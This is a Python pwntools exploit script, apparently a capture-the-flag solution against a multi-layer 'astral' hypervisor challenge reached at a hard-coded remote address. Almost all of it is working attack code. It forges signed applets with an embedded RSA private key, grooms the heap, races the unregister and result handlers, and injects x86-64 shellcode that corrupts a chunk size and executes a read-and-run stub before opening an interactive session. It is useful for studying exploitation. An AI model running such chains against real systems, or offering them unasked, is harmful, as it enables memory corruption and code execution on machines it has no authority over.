from pwn import *
import hashlib
from Crypto.Signature import pkcs1_15
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from assembler import aasm
import binascii

context.arch = 'amd64'

###Util
def genKey(size):
    '''
    k = RSA.generate(size)
    print(f'n = {k.n}')
    print(f'e = {k.e}')
    print(f'd = {k.d}')
    print(f'p = {k.p}')
    print(f'q = {k.q}')
    '''
    #n, e, d, p, q
    n = 21171009082903914951667318370642291045692796869958954643722088216142147882253767840887961100355137710362089495842852802587997892237625941064021250560476799326167191827697121941664794224698136464211627744698488458728738531470357408114552250412380210131627601562747041931086880317900979156590999732467529644272118410952441808977318917199874844809309666527342405701370009997253257393475623148604320310819277246488115240652534663038253877478550757625917385995616022874955900085296787079261560024157208651754992639295414413303051790549870265343065330370613104200620617655392887957154686849585510179728449780413388407485437
    e = 65537
    d = 1610107298494954576771103828201990313021565265408744978912245268951988961687647319238686850396647620929738080315771840049120779016210493259507574623587538139393759645195834109552508516020746855543384738186267926521182157033143551145077697394111815651442160506112912457772247481949096775275625836039966501815186091296962456250361999034430216192307282026608357073654805784882869176163072093716668340111897748037285113505033467615759514537063051266117269168609094815157533508013585686085106853147229077530260563057006340468064491249346259710638459872691616543300897343211945547136911447593155569475182437025095589705153
    p = 134044562026558397395438271043288356414291825175675883159490011085282417582339680523519465390585341987506003474384039595224765284764033208095162251323944101019624805110895671722701334251805913017367906573654002903179372603553250865107088458905591402201596665174871103887468507363529267586248647333373151288897
    q = 157940081737215714101272835747726670030883118110573418327888351745825766243034021141082130293326962308794122812021643730127210359909773858053458232302462101221368621273042912989097374820896132106599699654192664950598693111405879872729221562288749012832240796190575347983220641281491057761896899682073808133821
    k = RSA.construct((n, e, d, p, q))
    s = pkcs1_15.new(k)
    return s

def genPreimageChain(seed, length):
    if type(seed) == bytes:
        val = seed.ljust(8,b'\x00')[:8]
    else:
        seed &= (1 << 64) - 1
        val = p64(seed)
    res = [val]
    for i in range(length - 1):
        res.append(SHA256.new(res[-1]).digest()[:8])
    return res[::-1]

def compileApplet(fname):
    with open(fname, 'r') as f:
        data = f.read()
    bcode = aasm(data)
    return bcode

def registerApplet(bcode, nonce, signer, authsig, ignoreRes = False):
    r.sendline(b'1')
    r.sendline(str(len(bcode)).encode())
    r.send(binascii.hexlify(bcode))
    r.send(binascii.hexlify(nonce.ljust(0x100, b'\x00')[:0x100]).ljust(0x200, b'0'))
    r.send(binascii.hexlify(int.to_bytes(signer._key.n, 0x100, 'little')))
    r.send(binascii.hexlify(int.to_bytes(signer._key.e, 0x100, 'little')))
    r.send(binascii.hexlify(authsig).ljust(0x200, b'0'))
    if ignoreRes is False:
        print(r.recvuntil(b' : ').decode())
        aid = int(r.recvline()[:-1])
        message = int.to_bytes(signer._key.n, 0x100, 'little') + int.to_bytes(signer._key.e, 0x100, 'little') + nonce.ljust(0x100, b'\x00')[:0x100] + bcode
        digest = SHA256.new(message)
        assert u64(digest.digest()[:8]) == aid
        sig = signer.sign(digest)
        return aid, sig

def unregisterApplet(aid, signature):
    r.sendline(b'2')
    r.sendline(str(aid).encode())
    r.send(binascii.hexlify(signature).ljust(0x200,b'0'))

def invokeApplet(aid, arg):
    r.sendline(b'3')
    r.sendline(str(aid).encode())
    r.sendline(str(len(arg)).encode())
    r.send(binascii.hexlify(arg))
    print(r.recvuntil(b' : ').decode())
    tid = int(r.recvline()[:-1])
    return tid

def getResult(tid):
    r.sendline(b'4')
    r.sendline(str(tid).encode())
    status = r.recvline()
    if b'finished' in status:
        output = r.recvline()
    else:
        output = b''
    return output

def getStorage(aid):
    r.sendline(b'5')
    r.sendline(str(aid).encode())
    r.sendline(b'0')
    print(r.recvuntil(b' : ').decode())
    return r.recvline()

def sync():
    sleep(0.1)
    r.sendline(b'9')
    print(r.recvuntil(b'+-------', drop = True).decode())
    r.recvuntil(b'| 10. leave                  |\n')
    r.recvline()

###Exploit
#r = process(['./astral/build/hypervisor', './astral/build/processor', './astral/build/kernel', './astral/build/user'])
r = remote('3.219.33.123', 10101)

r.sendline(b'4')
r.sendline(b'4')
r.send(b'M30W')
r.send(b'M30W')

signer = genKey(2048)

bcode = binascii.unhexlify(b'4003004119003400000000000120023001015a21440400400a00fd401c00fd56005611ff3002085a2b42f3ff27995a8944ecff281050102f90fd400100fd3009105a9b42d9ff5010590a300208278950202f90300302513e59e33700633193a9d18f5ea530011059a2fe203130000850022f825a8144a7ff51022f92270030021059b15121fefd')
authsig = binascii.unhexlify(b'2fd4be9be84da8a203cfa80f008fe7a4b14a654d504a67f90c898da101a1527a8f8d43e1dd4eb4f0465deaf030ca2f723b269d959bfb47905f8c169d1028a5f41197b4b51c48bb85e578ea66b6bfd6e2b10d0c8b151fa8774fe91f56e9ad5ff5bff9fa5af6b0e52c08ea014b6b55115918d2d60860464d865fe2c521503fb2a4ed3a551d9c27d933d3de1d183de0e2d085166c9815843546bf6a3698a02a107ca57b6f7d329e1a3e9496ad7f1c69e069cd84947d98b241f5226db74eb018494945c21420ad2cfbfb4b2c0f586f7820794eedf2df8e7527d98873535c5d05ffb8df44c4f8b5cf3dc34515806ee7aa85cba75e1872a340435efffb13a6a395a812')

#nonce is found through bruteforcing for aid that have lower 32 bit 0
aid1, sig1 = registerApplet(bcode, p64(0x57480194), signer, authsig)
print(aid1)
aid2, sig2 = registerApplet(bcode, b'M30W1', signer, authsig)
print(aid2)

#fragmentize heap, required to ensure fetching phys results in top of list chunk
'''
for i in range(0x2000):
    if i % 0x100 == 0:
        print(hex(i))
    getResult(0)
'''
for i in range(0x20):
    print(hex(i))
    payload = b''
    for j in range(0x100):
        payload += b'4\n0\n'
    r.send(payload)
    for j in range(0x100):
        r.recvline()


chain = genPreimageChain(0x0020000400000800, 2)

tid1 = invokeApplet(aid1, chain[0]) #initialize
#tid1 = 0 #prevent debug clobber
print(tid1)

print(getResult(tid1))
print(getStorage(aid1)[:0x50])

print('--------------------')

bcode = compileApplet('./exp_user.aa')
tid2 = invokeApplet(aid1, (chain[1] + p64(aid1)) * 0x21 + bcode)
#tid2 = 0 #prevent debug clobber
print(tid2)

sync()
r.sendline(b'9')

#for applet processor
sc = asm(f'''
          jmp MAIN

          //rsi -> buf, rdx -> size
          READ_MSG:
            READ_LOOP:
              mov rax, 0
              mov rdi, 0x100
              syscall
              cmp rax, 0
              jle READ_LOOP
              sub rdx, rax
              add rsi, rax
              cmp rdx, 0
              jne READ_LOOP
            ret

          //rsi -> buf, rdx -> size
          WRITE_RESPONSE:
            mov rax, 1
            mov rdi, 0x101
            syscall
            ret

          //rsi -> buf, rdx -> size
          WRITE_INTERRUPT:
            mov rax, 1
            mov rdi, 0x102
            syscall
            ret

          //rdi -> sec
          SLEEP:
            push 0
            push rdi
            lea rdi, [rsp]
            xor rsi, rsi
            mov rax, 35
            syscall
            pop rax
            pop rax
            ret

          MAIN:
            //cleanup tasks to prevent issues...
            mov rbx, 0x1f
            CLEANUP_LOOP:
              mov rsi, 0x10008000
              mov byte ptr [rsi], 0xf1
              mov qword ptr [rsi + 1], rbx
              mov qword ptr [rsi + 9], 0
              mov rdx, 0x2011
              call WRITE_INTERRUPT
              mov rsi, 0x10008000
              mov rdx, 0x6091
              call READ_MSG
              mov rsi, 0x10008000
              mov byte ptr [rsi], 0x03
              mov qword ptr [rsi + 1], 0
              mov rdx, 0x9
              call WRITE_RESPONSE
              dec rbx
              cmp rbx, 0
              jne CLEANUP_LOOP

            //at this point, only one task is left running, we will use it to send subinvoke interrupts

            ////// USER EXPLOIT //////

            //USER_STATE_SYNC_REGISTER
            mov rsi, 0x10008000
            mov rdx, 0x1109
            call READ_MSG
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0x01
            mov qword ptr [rsi + 1], 0xffffffffffffffff
            mov rdx, 9
            call WRITE_RESPONSE

            //USER_SLEEP
            mov rdi, 1
            call SLEEP

            //USER_BRINK_OF_UNREG

            //USER_RACE_DUMMY_INTERRUPT (dummy, note that we cant use other interrupts since they will cause pipe to fill up)
            //or maybe we can, just have to do write retry, leave for later... 
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0xf3
            mov rdx, 1
            call WRITE_INTERRUPT

            //USER_RACE_INVOKE_INTERRUPT
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0xf2
            mov qword ptr [rsi + 0x01], 0
            mov rax, {aid2}
            mov qword ptr [rsi + 0x09], rax
            mov qword ptr [rsi + 0x11], 0
            mov qword ptr [rsi + 0x19], 0
            mov qword ptr [rsi + 0x21], 0
            mov rdx, 0x5089
            call WRITE_INTERRUPT

            //USER_ACTUAL_UNREG
            //trigger unreg (read -> interrupt 1, digest -> interrupt 2, signature -> interrupt 3)

            //USER_RACE_INVOKE_REQUEST
            mov rsi, 0x10008000
            mov rdx, 0x3121
            call READ_MSG

            mov rsi, 0x10008000
            mov byte ptr [rsi], 0x02
            mov qword ptr [rsi + 1], 0
            mov rdx, 9
            call WRITE_RESPONSE

            //USER_RACE_FREE

            //USER_BRINK_OF_RESULT

            //USER_STATE_SYNC_SLEEP
            mov rdi, 4
            call SLEEP

            //USER_SEND_OVERWRITE_INTERRUPT1 (chunk size)
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0xf1
            mov qword ptr [rsi + 0x01], 1
            mov qword ptr [rsi + 0x09], 0
            mov qword ptr [rsi + 0x1011], 0x4000
            mov rdx, 0x2011
            call WRITE_INTERRUPT
            mov rsi, 0x10008000
            mov rdx, 0x6091
            call READ_MSG
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0x03
            mov qword ptr [rsi + 1], 0
            mov rdx, 0x9
            call WRITE_RESPONSE

            //USER_SEND_OVERWRITE_INTERRUPT2 (shellcode)
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0xf1
            mov qword ptr [rsi + 0x01], 0
            mov qword ptr [rsi + 0x09], 0x1000
              //jmp -0x80
            mov qword ptr [rsi + 0x1009], 0x80eb
              //xor eax, eax
              //push rax
              //pop rdi
              //lea rsi, [rip + 7]
              //mov edx, 0x1000
              //syscall
            mov rax, 0x07358d485f50c031
            mov qword ptr [rsi + 0xf8b], rax
            mov rax, 0x00001000ba000000
            mov qword ptr [rsi + 0xf93], rax
            mov rax, 0xccccccccfeeb050f
            mov qword ptr [rsi + 0xf9b], rax
            mov rdx, 0x2011
            call WRITE_INTERRUPT
          TAG:
          jmp TAG
          ''').ljust(0x3300, b'\xcc')

registerApplet(sc[0x0000:0x1000], b'M30W', signer, sc[0x1000:0x1100], ignoreRes = True)
registerApplet(sc[0x1100:0x2100], b'M30W', signer, sc[0x2100:0x2200], ignoreRes = True)
registerApplet(sc[0x2200:0x3200], b'M30W', signer, sc[0x3200:0x3300], ignoreRes = True)


#USER_STATE_SYNC_REGISTER
registerApplet(b'M30W', b'M30W', signer, b'M30W', ignoreRes = True)

#USER_BRINK_OF_UNREG
r.sendline(b'2')
r.sendline(str(aid2).encode())
r.send(binascii.hexlify(sig2)[:-1])

sleep(2)

#USER_ACTUAL_UNREG
r.send(binascii.hexlify(sig2)[-1:])

print('brink of result')
#USER_BRINK_OF_RESULT
r.sendline(b'4')

sleep(8)

#USER_ACTUAL_RESULT
r.sendline(b'2')

#TRIGGER
r.sendline(b'4')
r.sendline(b'0')

#for userspace
sc = asm(f'''
          mov rax, 0xf1a9f1a9
          syscall
          mov rax, 0x3c
          mov rdi, 0
          syscall
          ''').ljust(0x1000, b'\x00')
r.send(sc)

r.interactive()

'''
applet 1108
invoke 3120
resume 6090
context 5088
res 2010
'''
